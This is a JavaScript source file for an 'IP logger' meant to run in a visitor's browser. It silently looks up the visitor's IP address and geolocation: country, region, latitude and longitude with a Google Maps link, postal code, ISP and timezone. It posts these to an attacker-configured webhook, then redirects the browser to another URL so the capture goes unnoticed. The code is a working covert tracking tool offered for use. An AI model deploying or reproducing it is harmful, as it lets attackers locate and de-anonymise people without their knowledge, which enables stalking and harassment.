const webhookURL = process.env.webhookURL || '';
const baseURL = process.env.baseURL || '';
const avatarURL = process.env.avatarURL || '';
const finalURL = process.env.finalURL || '';

export const LogIP = async () => {
    const data = await (await fetch('https://ipwho.is')).json();

    const main_field = `
    **IP:** ${data.ip}
    **Type:** ${data.type}
    `;

    const location_field = `
    **Continent:** ${data.continent}
    **Country:** ${data.country} :flag_${data.country_code.toLowerCase()}:
    **Region:** ${data.region}
    **Latitude:** ${data.latitude}
    **Longitude:** ${data.longitude}
    **Postal:** ${data.postal}
    **[Open location in Google Maps](https://www.google.com/maps/search/?api=1&query=${data.latitude},${data.longitude})**
    `;

    const connection_field = `
    **ASN:** ${data.connection.asn}
    **Org:** ${data.connection.org}
    **ISP:** ${data.connection.isp}
    `;

    const timezone_field = `
    **ID:** ${data.timezone.id}
    **UTC:** ${data.timezone.utc}
    **Offset:** ${data.timezone.offset}
    `;

    const embed = {
        'title': '__Abysmal IP Logger__',
        'description': `From: [${baseURL}](https://${baseURL})`,
        'thumbnail': {
            'url': avatarURL,
        },
        'color': 13346551,
        'fields': [
            {
                'name': ':zap: **Main**',
                'value': main_field,
                'inline': true,
            },
            {
                'name': ':earth_americas: **Location**',
                'value': location_field,
                'inline': true,
            },
            {
                'name': '\u200b',
                'value': '\u200b',
            },
            {
                'name': ':satellite: **Connection**',
                'value': connection_field,
                'inline': true,
            },
            {
                'name': ':clock1: **Timezone**',
                'value': timezone_field,
                'inline': true,
            },
        ],
    };

    const params = {
        'username': 'Abysmal IP Logger',
        'avatar_url': avatarURL,
        'embeds': [embed],
    };

    await fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(params)
    });

    window.location.href = finalURL;
};